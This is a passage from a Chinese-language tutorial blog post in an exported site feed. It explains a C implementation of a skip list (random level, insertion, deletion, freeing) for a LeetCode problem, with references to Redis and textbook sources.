<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetSkipNodeRandomLevel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> level = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (rand() &amp; <span class="number">0x1</span>) &#123;					<span class="comment">// 抛硬币思想，随机数为奇数的概率可认为是1/2</span></span><br><span class="line">        ++level;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min(level,SKIPLIST_MAXLEVEL); 	<span class="comment">// 返回的最大层数不超过32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-2-新增节点后，如何更新跳表中对应的N条单链表？"><a href="#3-2-新增节点后，如何更新跳表中对应的N条单链表？" class="headerlink" title="3.2 新增节点后，如何更新跳表中对应的N条单链表？"></a>3.2 新增节点后，如何更新跳表中对应的N条单链表？</h5><p>举例说明，给定一个包含6个元素，层数为4的跳表，现在新增一个节点值为80，层数为5，插入前后的变化如下：</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image7.png"></p>
<p>可以看出，往跳表中插入元素，<strong>只需在遍历跳表的过程中，保存这5条链表待插入位置的前驱节点(红圈表示)，再分别对每条单链表执行插入操作即可，最后更新跳表的长度和层高</strong>。代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳表的插入 O(logN)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">skiplistAdd</span><span class="params">(Skiplist* obj, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">preNodes</span>[<span class="title">SKIPLIST_MAXLEVEL</span>];</span> <span class="comment">// 保存待插入节点的所有前驱节点的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = obj-&gt;level; i &lt; SKIPLIST_MAXLEVEL; ++i) &#123;</span><br><span class="line">        preNodes[i] = obj-&gt;head;					  <span class="comment">// 初始化值为附加头结点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于target, 沿当前层继续查找插入的位置</span></span><br><span class="line">        <span class="keyword">while</span>( p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; num) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        preNodes[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> newLevel = GetSkipNodeRandomLevel();		<span class="comment">// 计算新插入节点的层数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">newNode</span> =</span> skiplistNodeCreate(newLevel, num);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; newLevel; ++i) &#123;</span><br><span class="line">        newNode-&gt;level[i].next = preNodes[i]-&gt;level[i].next;</span><br><span class="line">        preNodes[i]-&gt;level[i].next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;level = max(obj-&gt;level, newLevel);         <span class="comment">// 完成插入动作后，更新跳跃表当前层数</span></span><br><span class="line">    ++obj-&gt;length;									<span class="comment">// 完成插入动作后，更新跳跃表长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-删除"><a href="#4-删除" class="headerlink" title="4. 删除"></a>4. 删除</h4><p>设计<code>bool skiplistErase(Skiplist* obj, int num)</code>方法实现跳表的删除，要点如下：</p>
<ul>
<li>遍历跳表，确认待删除的值是否存在，这步和跳表的查找操作类似。</li>
<li>设待删除节点的层数为N，需对N条单链表分别执行删除操作。</li>
<li>成功删除节点后，注意更新跳表的长度和层高。</li>
</ul>
<p>代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳跃表删除操作 O(logN)</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">skiplistErase</span><span class="params">(Skiplist* obj, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">preNodes</span>[<span class="title">SKIPLIST_MAXLEVEL</span>];</span> <span class="comment">// 存储所有待删除节点的前驱节点的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于num, 沿当前层继续查找</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; num) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        preNodes[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = p-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">    <span class="keyword">if</span> (p &amp;&amp; p-&gt;value == num) &#123;	</span><br><span class="line">        skiplistNodeDelete(obj, p, preNodes);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">skiplistNodeDelete</span><span class="params">(Skiplist *obj, SkiplistNode *cur, SkiplistNode **preNodes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; obj-&gt;level; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preNodes[i]-&gt;level[i].next == cur) &#123; <span class="comment">// 被删除的节点层数可能比跳表层数少，所以要加上这里的判断</span></span><br><span class="line">            preNodes[i]-&gt;level[i].next = cur-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果删除的节点是层数最大的，那么可能需要更新跳表长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = obj-&gt;level - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj-&gt;head-&gt;level[i].next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        --obj-&gt;level;</span><br><span class="line">    &#125;</span><br><span class="line">    --obj-&gt;length;</span><br><span class="line">    <span class="comment">// 释放被删除节点空间</span></span><br><span class="line">    <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-跳表的释放"><a href="#5-跳表的释放" class="headerlink" title="5. 跳表的释放"></a>5. 跳表的释放</h4><p>释放操作很简单。对于每个跳跃表节点，只需调1次<code>free()</code>即可。这也是<code>SkiplistNode</code>结构中<code>level</code>成员设计为柔性数组的好处。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">skiplistFree</span><span class="params">(Skiplist* obj)</span> &#123;</span><br><span class="line">    SkiplistNode *cur = obj-&gt;head-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">    SkiplistNode *d;</span><br><span class="line">    <span class="keyword">while</span>(cur) &#123;</span><br><span class="line">        d = cur;</span><br><span class="line">        cur = cur-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">        <span class="built_in">free</span>(d);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;head);		   </span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码参考:<a href="https://leetcode-cn.com/problems/design-skiplist/solution/tiao-yue-biao-cyu-yan-shi-xian-by-pcj700">https://leetcode-cn.com/problems/design-skiplist/solution/tiao-yue-biao-cyu-yan-shi-xian-by-pcj700</a></p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>【1】 <a href="https://www.jianshu.com/p/9d8296562806">Skip List–跳表</a></p>
<p>【2】《数据结构与算法分析 C语言描述》原书第2版 10.4.2 —— 跳跃表</p>
<p>【3】《Redis设计与实现》—— 第5章 跳跃表</p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
</search>
